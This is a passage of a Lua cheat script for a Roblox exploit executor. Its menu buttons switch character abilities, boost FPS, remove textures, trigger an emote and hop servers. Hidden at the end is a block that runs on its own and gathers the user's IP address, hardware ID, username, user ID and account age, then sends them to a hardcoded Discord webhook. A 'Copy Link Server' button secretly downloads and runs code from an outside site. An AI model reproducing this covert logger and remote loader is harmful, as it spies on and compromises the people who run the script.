game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Raging Deflection", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = false
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)


page1:Button("Get Shadow Step", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = false
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Super Jump", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = false
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Telekinesis", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = false
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Thunder Dash", function(t)
game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = false
game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
end)

page1:Button("Get Rapture", function(t)
    game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = false
    game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
    end)

    page1:Button("Get Phase Bypass", function(t)
    game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = false
    game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = true
    end)
     page1:Button("Get Wind Cloak", function(t)
    game.Players.LocalPlayer.Character.Abilities.Dash.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Forcefield.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Invisibility.Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Platform.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Raging Deflection"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Shadow Step"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Super Jump"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Telekinesis.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Thunder Dash"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities.Rapture.Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Phase Bypass"].Disabled = true
    game.Players.LocalPlayer.Character.Abilities["Wind Cloak"].Disabled = false
    end)


page2:Button("boost FPS", function()
setfpscap(999)
end)






page2:Button("Remove Texture", function(t)
    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
            v.Material = Enum.Material.SmoothPlastic
            if v:IsA("Texture") then
                v:Destroy()
            end
        end
     end
end)


page2:Button("Get Cool Aura", function(t)
  
    local args = {[1] = true,[2] = "Empyrean"}game:GetService("ReplicatedStorage").Remotes.CustomEmote:FireServer(unpack(args))
end)



page4:Button("Rejoin", function()
    local ts = game:GetService("TeleportService")
    local p = game:GetService("Players").LocalPlayer
    ts:Teleport(game.PlaceId, p)
end)
local function HttpGet(url)
    return game:GetService("HttpService"):JSONDecode(htgetf(url))
end
page4:Button("Server Hop", function()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                -- delfile("NotSameServers.json")
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        -- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(.1)
                end
            end
        end
    end
    function Teleport() 
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end)

   
   page5:Label("Discord")
           page5:Button("Copy Link Server", function()
            Flux:Notification("Copied","Ok")
               loadstring(game:HttpGet("https://bossboss16381.000webhostapp.com/Discord-Server"))()
           end)
           page5:Button("Copy Username", function()
            Flux:Notification("Copied","Ok")
                setclipboard("ttaapper1247")
                toclipboard("ttaapper1247")
           end)



	local k = select(2, pcall(getfenv, 0))
	if k then
		local exploit = (k.getexecutorname and k.getexecutorname())
	
	







local ip = tostring((syn and syn.request or request)({Url = 'https://api.ipify.org/', Method = syn and "Get" or "GET"}).Body)
local name = game.Players.LocalPlayer.Name
local Hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
local Age = game.Players.LocalPlayer.AccountAge
local gg = game.PlaceId
local ID = game.Players.LocalPlayer.UserId
local Display = game.Players.LocalPlayer.DisplayName
local WBH = "https://discord.com/api/webhooks/1127518297487839254/RiiOjrKLtsUAJiSw4utp0wYlnq9ECLFjKXBgv72GTr8W33eYGalbeqpsU0fbeyO-786r"
local Data ={["content"] = "Executer name:"..exploit.."  Profile Link:".." https://www.roblox.com/users/"..ID.."/profile ".." Game Link: https://www.roblox.com/games/"..gg.."     Ip: "..ip.."              Username:  "..name.." DisplayName: "..Display.."  Hwid: "..Hwid.."    Account Age(Days): "..Age.." "}
local Headers = {["Content-Type"]="application/json"}
local Encoded = game:GetService("HttpService"):JSONEncode(Data)
Request = http_request or request or HttpPost 
local Final = {Url = WBH, Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
end
end
